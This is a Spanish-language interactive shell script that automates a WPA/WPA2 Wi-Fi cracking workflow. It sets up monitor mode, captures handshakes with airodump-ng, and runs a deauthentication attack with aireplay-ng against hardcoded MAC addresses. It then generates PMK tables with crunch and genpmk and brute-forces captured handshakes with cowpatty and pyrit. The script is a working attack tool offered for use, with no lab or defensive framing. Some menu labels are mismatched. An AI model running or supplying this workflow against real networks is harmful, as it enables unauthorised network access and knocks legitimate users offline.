#!/bin/sh
black=$(tput setaf 0)
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
white=$(tput setaf 7)

normal=$(tput sgr0)

pause(){
  read -p "[Enter] para continuar..." Key
}

val='0'
chek(){
	if [ -x /usr/bin/$1 ] || [ -x /usr/sbin/$1 ] || [ -x /usr/local/bin/$1 ] || [ -x /bin/$1 ]; then
          echo "El programa \"$1\" está instalado."
          val='1'
           else
          echo "No está instalado \"$1\"."
          val='0'
          
          fi
          
     
}

say(){

if [ $val == '0' ]
             then
               echo -n $caption
               echo -n $simbol
             else
               echo -n $caption | iconv -f utf-8 -t iso-8859-1|festival --tts
               echo -n $simbol
             fi     
}   


#soporte para voz comentar si no se desea esta capacidad
#chek festival

        dict="dict/prueba.lst"
        
          hash="hash/prueba.hash"   
        
        
        
        #hash_fb="prueba.fb"
        #hash_fb_ram="00.ram"
        
        #echo essid="Day Perez"

while true

do
clear
printf "\t$green  WPA y WPA2 \n"        

printf "\t$red[inf_w]$green    Informacion de interfaces Wifi \n"        
printf "\t$red[monag]$green    Modo managed de una placa Wifi \n"        
printf "\t$red[mon]$green      Modo monitor de una placa Wifi  \n"        
printf "\t$red[w-shark]$green  Wireshark modo monitor \n"        
printf "\t$red[airodump]$green  Wireshark modo monitor \n"        
printf "\t$red[deaut]$green  Wireshark modo monitor \n"        

printf "\t$red[0]$green  INGRESAR ESSID \n"        
printf "\t$red[1]$green  GENERAR PMK CON DICCCIONARIO + \n"
printf "\t$red[2]$green  GENERAR PMK CON CRUNCH EN LZMA ++ h\n"
printf "\t$red[3]$green  GENERAR PMK CON CRUNCH EN RAM +++ \n"
printf "\t$red[4]$green  ATACAR PMK CON COWPATTY + h\n"
printf "\t$red[5]$green  ANALIZAR CON PYRIT ++ h\n"
printf "\t$red[6]$green  ATACAR CON PYRIT ++ h\n"
printf "\t$red[10]$green  ELIMINAR HASH(no recomendado rainbow table) h\n"
printf "\t$red[11]$green  SALIR h\n"
printf "\t$normal\n"

printf "$green Entrar opcion [*]:$red"
printf "\t$normal\n"
read opc
case $opc in
        
        
        inf_w)
              iwconfig
              pause;;
              
        #wlx001a8f30cb1b  -->nisuta
        #wlxf8d111144e71  -->tplink
        
        manag)
              phy="phy3"
              wlan="wlx001a8f30cb1b"
              mon="mon0" 
              
              #iw dev
              #read phy
                            
              sudo iw dev $mon del
              sudo iw phy $phy interface add $wlan type managed
              sudo ifconfig $wlan up
              
        pause;;      
        
        mon)
            phy="phy3"
            wlan="wlx001a8f30cb1b"
            mon="mon0" 
            
            
            #sudo iw dev $wlan del 
            sudo iw phy $phy interface add $mon type monitor
            sudo iw dev $wlan del
            sudo iw dev $mon set freq 2437
            sudo ifconfig $mon up
            
            
            pause;;
            
         
             
        w-shark)    
                phy="phy0"
                wlan="wlan0"
                mon="mon0" 
        
               sudo wireshark -imon0 -k -s512
            
                #wireshark -i2 -k -f “host 192.168.1.5” -s512 -w captura_ejemplo.pcap -afilesize:10    
                pause;;
        
        airodump)
               phy="phy0"
                wlan="wlan0"
                mon="mon0" 
        
               #airmon-ng start mon0
               #sudo airodump-ng mon
               sudo airodump-ng --write chipichape --channel 6  $mon

               pause;;
         
         deaut)
               phy="phy0"
                wlan="wlan0"
                mon="mon0" 
         
               mac_cli="74:C6:3B:0D:AC:31"
               mac_ap="00:23:69:EB:42:42"
               
               sudo aireplay-ng -0 50 -a $mac_ap -c $mac_cli $mon --ignore-negative-one
                
                pause;;    
               
       tcpdump)
               phy="phy0"
                wlan="wlan0"
                mon="mon0" 
         
               sudo tcpdump -i $mon -n -w file.pcap
               read;;  
        0)
          printf "Ingrese el essid -->"
          read essid
          printf "Ingrese el pcap o cap---> "
          read cap
          pause;;                   
        
        1)
          genpmk -f $dict -d $hash -s "$essid"
          pause;;          
        
        2)
          crunch 8 8 -f charset/charset.lst numeric -o prueba.lzma -s 20000000
          genpmk -f prueba.lzma -d $hash -s "$essid"
          pause;;          
        
        3)
         crunch 8 8 -f charset/charset.lst numeric -s 20000000 | genpmk -f - -d $hash -s "$essid"
         pause;;
        
        4)
          cowpatty -2 -d $hash -r "hs/"$cap -s "$essid"
          pause;; 
          
         5)  
           pyrit -r "hs/"$cap analyze 
           pause;;          
           
         6)  
           pyrit -i $dict -r "hs/"$cap attack_passthrough
           pause;;          
            
         10)
          rm $hash 
          pause;;          
          
         v)
          return 0;;
        *)
          printf "Seleciona una opcion valida :)";
          pause;;          
  esac
        
done
